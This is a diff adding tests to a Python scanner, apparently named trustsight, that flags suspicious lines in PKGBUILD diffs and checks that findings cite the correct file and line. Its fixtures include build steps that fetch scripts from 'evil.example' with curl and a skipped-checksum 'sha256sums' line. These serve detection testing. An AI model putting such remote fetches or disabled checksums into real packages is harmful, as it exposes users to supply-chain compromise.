@@ -1,7 +1,7 @@
 from tests.conftest import SHARED_RULES
 from trustsight.differ import map_diff_lines
 from trustsight.tokenizer import tokenize_and_resolve, tokenize_and_resolve_indexed
-from trustsight.rules import apply_rules, get_raw_diff_lines
+from trustsight.rules import apply_rules, get_raw_diff_lines, get_raw_diff_lines_indexed
 
 
 # --- R001: Remote Script Execution ---
@@ -456,6 +456,102 @@ def test_resolved_indices_line_up_with_map_diff_lines():
         if r.startswith("++ "):
             continue
         assert idx in line_map
+
+
+# --- raw-line findings carry their true line ----------------------------
+
+
+def test_raw_finding_carries_its_true_line_past_a_blank_line():
+    # get_raw_diff_lines drops blank lines, so a raw-line index is not a
+    # map_diff_lines key once a blank line precedes the match: H001's
+    # `+sha256sums=('SKIP')` on PKGBUILD line 3 used to report line 2.
+    diff = (
+        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,5 @@\n"
+        " pkgname=foo\n"
+        " \n"
+        "+sha256sums=('SKIP')\n"
+        " pkgrel=1\n"
+    )
+    raw_lines, raw_indices = get_raw_diff_lines_indexed(diff)
+    resolved, _unresolved, indices = tokenize_and_resolve_indexed(diff)
+    triggered = apply_rules(
+        resolved, raw_lines, SHARED_RULES,
+        line_map=map_diff_lines(diff),
+        resolved_indices=indices,
+        raw_indices=raw_indices,
+    )
+    h001 = next(r for r in triggered if r["rule_id"] == "H001")
+    assert (h001["file"], h001["line"]) == ("PKGBUILD", 3)
+
+
+def test_raw_finding_carries_its_true_line_past_a_continuation():
+    # A joined continuation shifts every later raw index by one more.
+    diff = (
+        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,5 @@\n"
+        " pkgname=foo\n"
+        "+  curl \\\n"
+        "+    https://evil.example/hook.sh\n"
+        "+sha256sums=('SKIP')\n"
+    )
+    raw_lines, raw_indices = get_raw_diff_lines_indexed(diff)
+    resolved, _unresolved, indices = tokenize_and_resolve_indexed(diff)
+    triggered = apply_rules(
+        resolved, raw_lines, SHARED_RULES,
+        line_map=map_diff_lines(diff),
+        resolved_indices=indices,
+        raw_indices=raw_indices,
+    )
+    h001 = next(r for r in triggered if r["rule_id"] == "H001")
+    assert (h001["file"], h001["line"]) == ("PKGBUILD", 4)
+
+
+def test_raw_finding_attributes_the_right_file_across_a_boundary():
+    # With a dropped blank line before the second file's header, a raw
+    # index lands inside the previous file's map entries: the finding used
+    # to cite PKGBUILD for a match in foo.install.
+    diff = (
+        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,3 @@\n"
+        " pkgname=foo\n"
+        " \n"
+        "+pkgrel=2\n"
+        "--- a/foo.install\n+++ b/foo.install\n@@ -1,1 +1,2 @@\n"
+        " post_install() {\n"
+        "+sha256sums=('SKIP')\n"
+    )
+    raw_lines, raw_indices = get_raw_diff_lines_indexed(diff)
+    resolved, _unresolved, indices = tokenize_and_resolve_indexed(diff)
+    triggered = apply_rules(
+        resolved, raw_lines, SHARED_RULES,
+        line_map=map_diff_lines(diff),
+        resolved_indices=indices,
+        raw_indices=raw_indices,
+    )
+    h001 = next(r for r in triggered if r["rule_id"] == "H001")
+    assert (h001["file"], h001["line"]) == ("foo.install", 2)
+
+
+def test_raw_scope_classification_uses_the_same_domain_as_the_line_map():
+    # The scope maps are re-keyed with the candidates: a function_body
+    # rule must still fire - and cite the right line - when a dropped
+    # blank line sits between the function opener and the match.
+    diff = (
+        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,6 @@\n"
+        " pkgname=foo\n"
+        " \n"
+        "+build() {\n"
+        "+  curl -s https://evil.example/x\n"
+        "+}\n"
+    )
+    raw_lines, raw_indices = get_raw_diff_lines_indexed(diff)
+    resolved, _unresolved, indices = tokenize_and_resolve_indexed(diff)
+    triggered = apply_rules(
+        resolved, raw_lines, SHARED_RULES,
+        line_map=map_diff_lines(diff),
+        resolved_indices=indices,
+        raw_indices=raw_indices,
+    )
+    r010 = next(r for r in triggered if r["rule_id"] == "R010")
+    assert (r010["file"], r010["line"]) == ("PKGBUILD", 4)
 
 
 # --- Hard-to-spot malicious patterns ---
